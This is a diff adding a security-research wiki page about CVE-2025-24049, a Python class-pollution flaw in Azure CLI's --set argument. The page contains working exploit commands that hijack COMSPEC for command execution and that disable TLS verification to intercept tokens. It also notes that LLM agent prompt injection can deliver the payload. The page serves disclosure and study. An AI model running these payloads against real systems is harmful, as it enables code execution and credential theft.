@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azure CLI | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/types/" >Vulnerability Types</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/consequences/" >Consequences</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Collection</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcases</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/reference/" >Reference</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/reference/cve-index/" >CVE Index</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/faq/" >FAQ</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/history/" >History</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="azure-cli-cve-2025-24049">Azure CLI (CVE-2025-24049)</h1>
+<p><strong>Azure Command-Line Interface (CLI)</strong> is Microsoft&rsquo;s official tool for managing Azure resources (4.1K stars, 91.6K weekly downloads).</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Repository</td>
+          <td><a href="https://github.com/Azure/azure-cli">Azure/azure-cli</a></td>
+      </tr>
+      <tr>
+          <td>Version</td>
+          <td>v2.68.0</td>
+      </tr>
+      <tr>
+          <td>CVE</td>
+          <td><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049">CVE-2025-24049</a></td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Agnostic-Get × Dual-Set</td>
+      </tr>
+      <tr>
+          <td>Input</td>
+          <td>Local (&ndash;set argument)</td>
+      </tr>
+      <tr>
+          <td>Status</td>
+          <td>Fixed</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Azure CLI processes the <code>--set</code> argument through <code>set_properties</code>, which splits the expression into key-value pairs and resolves the target object through <code>_find_property</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_properties</span>(instance, expression, force_string):
+</span></span><span style="display:flex;"><span>    key, value <span style="color:#f92672">=</span> _split_key_value_pair(expression)
+</span></span><span style="display:flex;"><span>    name, path <span style="color:#f92672">=</span> _get_name_path(key)
+</span></span><span style="display:flex;"><span>    instance <span style="color:#f92672">=</span> _find_property(instance, path)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(instance, dict):
+</span></span><span style="display:flex;"><span>        instance[name] <span style="color:#f92672">=</span> value              <span style="color:#75715e"># Item-Set</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        setattr(instance, make_snake_case(name), value)  <span style="color:#75715e"># Attr-Set</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_find_property</span>(instance, path):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> part <span style="color:#f92672">in</span> path:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(instance, dict):
+</span></span><span style="display:flex;"><span>            instance <span style="color:#f92672">=</span> instance[part]       <span style="color:#75715e"># Item-Get</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> hasattr(instance, make_snake_case(part)):
+</span></span><span style="display:flex;"><span>            instance <span style="color:#f92672">=</span> getattr(instance, make_snake_case(part))  <span style="color:#75715e"># Attr-Get</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> instance
+</span></span></code></pre></div><h2 id="detection-challenge">Detection Challenge</h2>
+<p>The <code>make_snake_case</code> function (lines 20-27) acts as a <strong>barrier</strong>: it converts keys to lowercase with underscores, preventing direct traversal of dunder names like <code>__class__</code>.</p>
+<p>However, Pyrl identifies that a <strong>second-order attribute get</strong> operation — <code>obj.__dict__[name]</code> — is still accessible because <code>__dict__</code> does not match the regex pattern. The <code>getattr</code> on line 18 retrieves the dictionary representation, and the get-item on line 16 can access arbitrary keys within it.</p>
+<h2 id="exploitation-token-leakage--os-command-injection">Exploitation: Token Leakage &amp; OS Command Injection</h2>
+<h3 id="os-command-injection-windows">OS Command Injection (Windows)</h3>
+<p><strong>Exploit command</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>az resource update --ids <span style="color:#e6db74">&#34;X&#34;</span> --set <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;__class__.__init__.__globals__.sys.modules.os.environ.COMSPEC=cmd /c calc *&#34;</span>
+</span></span></code></pre></div><p><strong>Key Path</strong>: <code>__class__.__init__.__globals__.sys.modules.os.environ.COMSPEC</code></p>
+<p><strong>Effect</strong>: On Windows, Azure CLI uses <code>COMSPEC</code> to spawn subprocesses. Overwriting it with a malicious command causes arbitrary code execution when Azure CLI subsequently spawns a subprocess.</p>
+<h3 id="token-leakage">Token Leakage</h3>
+<p><strong>Exploit command</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>az resource update --ids <span style="color:#e6db74">&#34;X&#34;</span> --set <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;__class__.__init__.__globals__.sys.modules.os.environ.REQUESTS_CA_BUNDLE=/dev/null&#34;</span>
+</span></span></code></pre></div><p><strong>Effect</strong>: Disabling SSL verification allows the attacker to intercept Azure authentication tokens via man-in-the-middle attack.</p>
+<h2 id="why-this-matters">Why This Matters</h2>
+<ul>
+<li>Azure CLI is installed on millions of developer machines and CI/CD pipelines</li>
+<li>The <code>--set</code> argument is commonly used in automation scripts</li>
+<li>An attacker who can influence the <code>--set</code> value (e.g., via a malicious config file, CI pipeline parameter, or LLM agent prompt injection) achieves command execution</li>
+<li>Microsoft acknowledged and patched the vulnerability, assigning CVE-2025-24049</li>
+</ul>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>See <a href="https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/azure-cli/poc"><code>cp-collection/azure-cli/poc/</code></a> for the full exploit.</p>
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
